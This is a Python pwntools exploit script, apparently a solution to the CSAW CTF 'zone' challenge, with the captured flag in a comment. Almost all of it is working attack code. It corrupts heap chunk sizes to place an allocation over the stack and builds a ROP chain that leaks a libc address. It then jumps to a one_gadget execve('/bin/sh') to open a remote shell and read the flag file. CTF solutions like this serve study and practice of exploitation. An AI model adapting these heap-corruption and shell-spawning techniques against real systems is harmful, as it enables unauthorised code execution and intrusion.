#!/usr/bin/env python
# -*- coding: ascii -*-
from pwn import *
import os

# flag{d0n7_let_m3_g3t_1n_my_z0n3}

#myenv = os.environ.copy()
#myenv['LD_PRELOAD'] = './libc-2.23.so'

e = ELF('zone')
l = ELF('./libc-2.23.so')

#y = process( './zone' , env = myenv )
#print util.proc.pidof(y)

host , port = 'pwn.chal.csaw.io' , 5223
y = remote( host , port )


def alloc( size ):
    y.sendlineafter( 'Exit' , '1' )
    sleep(0.1)
    y.sendline( str( size ) )

def free():
    y.sendlineafter( 'Exit' , '2' )

def mod( data ):
    y.sendlineafter( 'Exit' , '3' )
    sleep(0.1)
    y.send( data )

def show():
    y.sendlineafter( 'Exit' , '4' )

y.recvuntil('0x')
zone = int( y.recvline().strip() , 16 )
log.success( 'Zone -> {}'.format( hex( zone ) ) )

alloc( 0x40 )
mod( 'a' * 0x40 + '\x80' )
alloc( 0x40 )
mod( 'b' * 0x40 + '\x40' )
free()

alloc( 0x40 )
free()

alloc( 0x80 )
mod( 'D' * 0x40 + p64( 0x40 ) + p64( zone + 0x88 - 0x10 ) + '\n' )
alloc( 0x40 )

context.arch = 'amd64'

main = 0x400bc6
pop_rdi = 0x404653
pop_rsi = 0x4051f8


p = flat(
    pop_rdi,
    e.got['__libc_start_main'],
    e.plt['puts'],
    main
)

alloc( 0x40 )
mod( p + '\n' )

y.sendlineafter( 'Exit' , '5' )
y.recvline()
l.address += u64( y.recv(6).ljust( 8 , '\x00' ) ) - l.symbols['__libc_start_main']
log.success( 'libc -> {}'.format( hex( l.address ) ) )


y.recvuntil('0x')
zone = int( y.recvline().strip() , 16 )
log.success( 'Zone2 -> {}'.format( hex( zone ) ) )

alloc( 0x40 )
mod( 'a' * 0x40 + '\x80' )
alloc( 0x40 )
mod( 'b' * 0x40 + '\x40' )
free()

alloc( 0x40 )
free()

alloc( 0x80 )
mod( 'D' * 0x40 + p64( 0x40 ) + p64( zone + 0x88 - 0x10 ) + '\n' )
alloc( 0x40 )

context.arch = 'amd64'

main = 0x400bc6
pop_rdi = 0x404653
pop_rsi = 0x4051f8

# https://github.com/david942j/one_gadget
''' 
0xf1117 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

p = flat(
    l.address + 0xf1117
)

alloc( 0x40 )
mod( p + '\n' )

y.sendlineafter( 'Exit' , '5' )

y.sendline( 'cat /home/`whoami`/flag' )


y.interactive()